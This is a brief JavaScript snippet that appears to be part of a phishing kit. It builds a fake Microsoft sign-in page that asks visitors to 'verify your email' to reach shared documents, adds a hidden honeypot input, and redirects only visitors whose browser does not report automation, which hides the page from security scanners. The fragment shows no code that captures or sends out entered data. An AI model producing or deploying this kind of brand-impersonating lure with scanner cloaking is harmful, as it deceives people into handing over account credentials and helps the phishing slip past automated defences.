const page = `<img src="Microsoft_logo.svg"><p>Secure shared documents, kindly verify your email and continue.</p><input placeholder="Email, phone, or Skype"><input class="honeypot-field">`;
if (!navigator.webdriver) window.location.href="https://login.microsoftonline.com/next";
